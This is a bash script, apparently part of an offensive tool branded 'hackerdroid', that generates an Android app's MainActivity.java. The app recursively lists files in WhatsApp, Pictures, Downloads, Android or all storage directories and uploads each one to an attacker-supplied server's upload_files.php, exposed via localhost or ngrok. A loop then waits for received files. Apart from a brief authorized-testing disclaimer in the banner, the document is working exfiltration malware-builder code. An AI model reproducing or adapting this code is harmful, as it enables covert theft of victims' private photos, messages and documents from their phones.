dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }

}

banner() {


printf "     \e[1;92m _                 _                     _            _     _ \n"
printf "     | |               | |                   | |          (_)   | |\n"
printf "     | |__  _____  ____| |  _ _____ ____   __| | ____ ___  _  __| |\n"
printf "     |  _ \(____ |/ ___) |_/ ) ___ |  _ \ / _  |/ ___) _ \| |/ _  |\n"
printf "     | | | / ___ ( (___|  _ (| ____| | | ( (_| | |  | |_| | ( (_| |\n"
printf "     |_| |_\_____|\____)_| \_)_____)_| |_|\____|_|   \___/|_|\____|\e[0m\n"

printf "\n"
printf "      \e[1;91m Disclaimer: this tool is designed for security\n"
printf "       testing in an authorized simulated cyberattack\n"
printf "       Attacking targets without prior mutual consent\n"
printf "       is illegal!\n\n"

}

read_dir() {

printf "\e[1;77m[\e[0m\e[1;92m01\e[0m\e[1;77m] WhatsApp (/storage/emulated/0/WhatsApp)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m02\e[0m\e[1;77m] Pictures (/storage/emulated/0/Pictures)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m03\e[0m\e[1;77m] Downloads (/storage/emulated/0/Download)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m04\e[0m\e[1;77m] Android (/storage/emulated/0/Android)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m05\e[0m\e[1;77m] Custom\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m06\e[0m\e[1;77m]\e[0m\e[1;93m Internal Storage (/storage/emulated/0/)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m07\e[0m\e[1;77m]\e[0m\e[1;31m ALL: External + Internal Storage (/storage/)\e[0m\n"
printf "\n"
printf "\e[1;77m[\e[0m\e[1;93mEnter Key\e[0m\e[1;77m]\e[0m\e[1;93m Continue\e[0m\n"
printf "\n"
internal=0
external=0
whatsapp=0
picture=0
download=0
android=0
custom=0
choose_dir=0
while [[ "$choose_dir" != "" ]]; do
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a dir or Hit Enter to continue: \e[0m' choose_dir

if [[ "$choose_dir" != 1 ]] && [[ "$choose_dir" != 2 ]] && [[ "$choose_dir" != 3 ]] && [[ "$choose_dir" != 4 ]] && [[ "$choose_dir" != 5 ]] && [[ "$choose_dir" != 6 ]] && [[ "$choose_dir" != 7 ]] && [[ "$choose_dir" != 99 ]] && [[ "$choose_dir" != "" ]]; then
printf "\e[1;93mInvalid!\e[0m\n"  

elif  [[ $choose_dir -eq 1 ]]; then
whatsapp=1

elif [[ $choose_dir -eq 2 ]]; then
picture=1

elif [[ $choose_dir -eq 3 ]]; then
download=1
elif [[ $choose_dir -eq 4 ]]; then
android=1
elif [[ $choose_dir -eq 5 ]]; then

read -p $'\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] (Ex: /storage/emulated/WhatsApp/Media): \e[0m' custom_dir
if [[ $custom_dir != '' ]]; then
custom=1
echo $custom_dir >> custom_dir
fi
elif [[ $choose_dir -eq 6 ]]; then
internal=1
elif [[ $choose_dir -eq 7 ]]; then
external=1

elif [[ $choose_dir -eq 99 ]]; then
exit 1

fi

done

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Setting:\n"

if [[ ! -d app/app/src/main/java/com/droidfiles/ ]]; then
mkdir -p app/app/src/main/java/com/droidfiles/
fi

cat app/main1 > app/app/src/main/java/com/droidfiles/MainActivity.java


if [[ "$internal" -eq 0 ]] && [[ "$external" -eq 0 ]] && [[ "$whatsapp" -eq 0 ]] && [[ "$download" -eq 0 ]] && [[ "$custom" -eq 0 ]] && [[ "$picture" -eq 0 ]] && [[ "$android" -eq 0 ]]; then
echo default
internal=1
fi


if [[ $external -eq 1 ]]; then
internal=0
whatsapp=0
download=0
picture=0
android=0
fi

if [[ $internal -eq 1 ]]; then
whatsapp=0
download=0
picture=0
android=0
printf "    \e[1;77m-\e[0m\e[1;93mInternal Storage\e[0m\n"

#
echo 'File dir1 = new File("/storage/emulated/0");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files1 = (List<File>) FileUtils.listFiles(dir1,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files1) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path1 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path1);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#

fi

if [[ "$external" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mExternal + Internal Storage\e[0m\n"

#
echo 'File dir2 = new File("/storage/");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files2 = (List<File>) FileUtils.listFiles(dir2,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files2) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path2 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path2);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#

fi

if [[ "$whatsapp" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mWhatsApp\e[0m\n"

#
echo 'File dir3 = new File("/storage/emulated/0/WhatsApp");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files3 = (List<File>) FileUtils.listFiles(dir3,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files3) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path3 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path3);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#

fi

if [[ "$download" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mDownloads\e[0m\n"


#
echo 'File dir4 = new File("/storage/emulated/0/Download");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files4 = (List<File>) FileUtils.listFiles(dir4,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files4) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path4 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path4);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java


#

fi

if [[ "$android" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mAndroid\e[0m\n"

#

echo 'File dir5 = new File("/storage/emulated/0/Android");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files5 = (List<File>) FileUtils.listFiles(dir5,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files5) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path5 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path5);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#
fi

if [[ "$picture" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mPictures\e[0m\n"

#

echo 'File dir6 = new File("/storage/emulated/0/Pictures");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files6 = (List<File>) FileUtils.listFiles(dir6,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files6) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path6 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path6);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#


fi

if [[ "$custom" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mCustom\e[0m\n"
lines=0
for line_dir in $(cat custom_dir); do



echo $line_dir

#
printf 'File custom_dir%s = new File(\"%s\");\n' $lines $line_dir >> app/app/src/main/java/com/droidfiles/MainActivity.java

printf 'List<File> c_files%s = (List<File>) FileUtils.listFiles(custom_dir%s,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);\n' $lines $lines >> app/app/src/main/java/com/droidfiles/MainActivity.java
printf '		for (File file : c_files%s) {\n' $lines >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
printf '            String c_path%s = file.getCanonicalPath();\n' $lines >> app/app/src/main/java/com/droidfiles/MainActivity.java
printf '            upload(c_path%s);\n' $lines >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#

let lines+=1

done
rm -rf custom_dir
fi

cat app/main2 >> app/app/src/main/java/com/droidfiles/MainActivity.java

printf "        String urlServer = \"%s/upload_files.php\";\n" $host >> app/app/src/main/java/com/droidfiles/MainActivity.java

cat app/main3 >> app/app/src/main/java/com/droidfiles/MainActivity.java


}


createmain() {

if [[ ! -d app/app/src/main/java/com/droidfiles/ ]]; then
mkdir -p app/app/src/main/java/com/droidfiles/
fi

cat app/main1 > app/app/src/main/java/com/droidfiles/MainActivity.java


}


configureapp() {

localhost=""
if [[ $localhost == "" ]]; then
localhost="localhost"
fi
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;93m Example using localhost:\e[0m\n"
printf "   \e[1;77m Start Server: \e[0m\e[92m php -c php.ini -S %s:4444 \e[0m\n" $localhost
printf "   \e[1;77m Web Server: \e[0m\e[92m http://%s:4444 \e[0m\n" $localhost

printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;93m Example using ngrok:\e[0m\n"

printf "   \e[1;77m Start Server: \e[0m\e[92m ./ngrok http 4444; php -c php.ini -S %s:4444 \e[0m\n" $localhost
printf "   \e[1;77m Web Server: \e[0m\e[92m https://*.ngrok.io \e[0m\n"


read -p $'\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m]\e[0m\e[1;93m Choose a Web Server: \e[0m' host

if [[ -z $host ]]; then
exit 1
fi

printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Configuring App...\e[0m\n\n"

createmain
read_dir

if [[ ! -d uploadedfiles/ ]]; then
mkdir uploadedfiles
fi
printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] App Configured. Build app/ folder using Android Studio.\e[0m\n"
}

checkrcv() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting Files,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e Log.log ]]; then
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] File Received!\e[0m\e[1;77m Saved: app/uploadedfiles/\e[0m\n"
rm -rf Log.log
fi
done 

}





banner
dependencies
#start
configureapp
